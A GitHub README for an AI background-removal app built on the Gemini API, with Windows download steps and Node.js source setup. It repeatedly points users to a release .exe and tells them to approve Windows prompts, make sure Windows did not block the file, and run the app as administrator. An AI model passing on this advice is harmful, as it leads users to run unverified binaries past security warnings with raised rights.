# 🖼️ ai-background-remover - Remove image backgrounds fast

[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/nctyy/ai-background-remover/releases)

## 📥 Download the app

Visit this page to download: https://github.com/nctyy/ai-background-remover/releases

Open the latest release, then download the Windows file listed there. After the download finishes, open the file to start the app.

## 🚀 What this app does

ai-background-remover helps you remove the background from an image. It uses AI to separate the main subject from the rest of the picture.

Use it for:
- Product photos
- Profile pictures
- Social media images
- Design mockups
- Simple cutouts for editing

## 🖥️ What you need

Before you run the app on Windows, check these items:

- Windows 10 or Windows 11
- A modern web browser
- Internet access for the first setup
- A Gemini API key
- Enough free space to download the app

If the release includes a Windows installer or .exe file, use that file on your PC.

## 📦 Download and install

1. Open the Releases page
2. Find the latest version
3. Download the Windows file
4. If the file is in a .zip folder, extract it first
5. If the file is an .exe installer, double-click it
6. Follow the on-screen steps
7. Start the app from the desktop shortcut or the app folder

If Windows asks for permission, choose Run or Yes.

## 🔑 Set up your API key

The app needs a Gemini API key to work.

1. Open the app folder
2. Find the file named `.env.local`
3. Open it with Notepad
4. Add your Gemini API key in this format:

`GEMINI_API_KEY=your_api_key_here`

5. Save the file
6. Close Notepad

If the file does not exist, create a new text file and name it `.env.local`

## 🏃 Run the app locally

If you want to run the source version on your computer:

1. Install Node.js
2. Open the app folder
3. Open Command Prompt in that folder
4. Install dependencies:

`npm install`

5. Add your Gemini API key to `.env.local`
6. Start the app:

`npm run dev`

7. Open the local address shown in the terminal

## 🧭 First time use

After the app starts:

1. Open an image file
2. Wait for the AI to process it
3. Review the result
4. Save the image with the background removed

For best results, use clear photos with a visible subject and simple lighting.

## 🧰 Common file types

The app works best with common image files such as:

- JPG
- JPEG
- PNG
- WebP

If the image is blurry or too dark, the result may need extra cleanup.

## 🔧 Troubleshooting

If the app does not open:

- Check that the file finished downloading
- Make sure Windows did not block the file
- Try opening the app as administrator
- Confirm that Node.js is installed if you run it from source

If the background does not remove correctly:

- Use a clearer image
- Try a photo with better contrast
- Make sure your Gemini API key is valid
- Check that the app can connect to the internet

If you see a missing file message:

- Extract the full zip folder
- Keep all files in the same folder
- Do not move the app file by itself

## 🗂️ Folder basics

You may see these files in the app folder:

- `.env.local` - stores your API key
- `package.json` - app setup file
- `node_modules` - installed app files
- `src` - app code and screens
- `public` - files used by the app

You do not need to edit most of these files for normal use.

## 📌 Useful links

- Releases page: https://github.com/nctyy/ai-background-remover/releases
- AI Studio app: https://ai.studio/apps/daf4aee4-8fb2-4176-a0fd-fd68cf71fdd7

## 🛠️ Run from source

For users who want to start the app from the project files:

1. Install Node.js
2. Open the project folder
3. Run `npm install`
4. Add `GEMINI_API_KEY` to `.env.local`
5. Run `npm run dev`
6. Open the local web address in your browser